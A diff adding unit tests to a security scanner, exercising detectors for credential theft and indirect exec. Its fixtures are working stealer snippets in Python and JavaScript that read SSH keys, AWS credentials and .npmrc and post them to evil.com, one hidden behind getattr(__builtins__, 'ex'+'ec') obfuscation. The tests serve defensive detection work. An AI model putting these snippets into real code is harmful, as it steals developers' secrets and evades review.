@@ -3,8 +3,10 @@ from __future__ import annotations
 from security_scanner.models import FileClassification, ObservationSeverity
 from security_scanner.source_analysis import (
     analyze_source,
+    detect_behavioral_patterns,
     detect_dependency_risks,
     detect_embedded_payloads,
+    detect_indirect_exec,
     detect_obfuscation,
     detect_secrets,
     detect_suspicious_imports,
@@ -359,3 +361,122 @@ def test_analyze_config_includes_dependency_check():
     categories = [o.category for o in obs]
     assert any("typosquat" in c for c in categories)
     assert any("postinstall" in c for c in categories)
+
+
+# -- Behavioral patterns --
+
+def test_detect_credential_theft_pattern():
+    """File reads sensitive paths AND makes network calls = credential theft."""
+    content = '''
+import os, json, urllib.request
+home = os.path.expanduser("~")
+creds = {}
+for f in [os.path.join(home, ".ssh", "id_rsa"), os.path.join(home, ".aws", "credentials")]:
+    creds[f] = open(f).read()
+urllib.request.urlopen(urllib.request.Request("https://evil.com/steal", data=json.dumps(creds).encode()))
+'''
+    obs = detect_behavioral_patterns(content, "stealer.py")
+    assert len(obs) >= 1
+    assert any("credential_access_exfil" in o.category for o in obs)
+    assert any(o.severity == ObservationSeverity.MEDIUM for o in obs)
+
+
+def test_detect_js_credential_theft():
+    content = '''
+const fs = require('fs');
+const https = require('https');
+const home = require('os').homedir();
+const data = fs.readFileSync(home + '/.npmrc', 'utf8');
+const req = https.request({hostname: 'evil.com', method: 'POST'}, () => {});
+req.end(data);
+'''
+    obs = detect_behavioral_patterns(content, "index.js")
+    assert any("credential_access_exfil" in o.category for o in obs)
+
+
+def test_detect_bulk_credential_access():
+    """Multiple sensitive file reads without obvious exfil."""
+    content = '''
+import os
+home = os.path.expanduser("~")
+data = {}
+data["ssh"] = open(os.path.join(home, ".ssh", "id_rsa")).read()
+data["aws"] = open(os.path.join(home, ".aws", "credentials")).read()
+data["npm"] = open(os.path.join(home, ".npmrc")).read()
+'''
+    obs = detect_behavioral_patterns(content, "collector.py")
+    assert any("bulk_credential_access" in o.category for o in obs)
+
+
+def test_clean_config_reader_no_behavioral_flag():
+    """Legitimate config reader -- reads one config, calls one API."""
+    content = '''
+import os
+config = open(os.path.expanduser("~/.config/myapp/settings.json")).read()
+print("Config loaded")
+'''
+    obs = detect_behavioral_patterns(content, "app.py")
+    assert obs == []
+
+
+def test_legitimate_aws_cli_not_flagged():
+    """AWS CLI legitimately reads credentials and makes requests -- but only one sensitive path."""
+    content = '''
+import boto3
+client = boto3.client("s3")
+client.list_buckets()
+'''
+    obs = detect_behavioral_patterns(content, "aws_util.py")
+    assert obs == []
+
+
+# -- Indirect exec --
+
+def test_detect_getattr_builtins():
+    content = "fn = getattr(__builtins__, 'exec')\nfn(payload)"
+    obs = detect_indirect_exec(content, "evil.py")
+    assert any("getattr_builtins" in o.category for o in obs)
+
+
+def test_detect_globals_dict_access():
+    content = "globals()['exec'](payload)"
+    obs = detect_indirect_exec(content, "evil.py")
+    assert any("dict_builtins" in o.category for o in obs)
+
+
+def test_detect_vars_builtins():
+    content = "vars(__builtins__)['exec'](code)"
+    obs = detect_indirect_exec(content, "evil.py")
+    assert any("dict_builtins" in o.category for o in obs)
+
+
+def test_detect_js_global_computed():
+    content = "const fn = global[dynamicName];\nfn(payload);"
+    obs = detect_indirect_exec(content, "evil.js")
+    assert any("global_computed" in o.category for o in obs)
+
+
+def test_clean_getattr_not_on_builtins():
+    """getattr on a regular object is fine."""
+    content = "value = getattr(myobj, 'some_method')()"
+    obs = detect_indirect_exec(content, "util.py")
+    assert obs == []
+
+
+def test_behavioral_plus_indirect_both_detected():
+    """Analytics stealer case: getattr exec + credential access + exfil."""
+    content = '''
+import os, json, base64, urllib.request
+ENDPOINT = "https://evil.com/v2/events"
+home = os.path.expanduser("~")
+ctx = {}
+for p in [os.path.join(home, ".npmrc"), os.path.join(home, ".ssh", "id_rsa"), os.path.join(home, ".aws", "credentials")]:
+    ctx[os.path.basename(p)] = open(p).read()
+encoded = base64.b64encode(json.dumps(ctx).encode()).decode()
+fn = getattr(__builtins__, 'ex' + 'ec')
+fn(f"urllib.request.urlopen(urllib.request.Request('{ENDPOINT}', data=b'{encoded}'))")
+'''
+    obs_behavioral = detect_behavioral_patterns(content, "analytics.py")
+    obs_indirect = detect_indirect_exec(content, "analytics.py")
+    assert len(obs_behavioral) >= 1
+    assert len(obs_indirect) >= 1
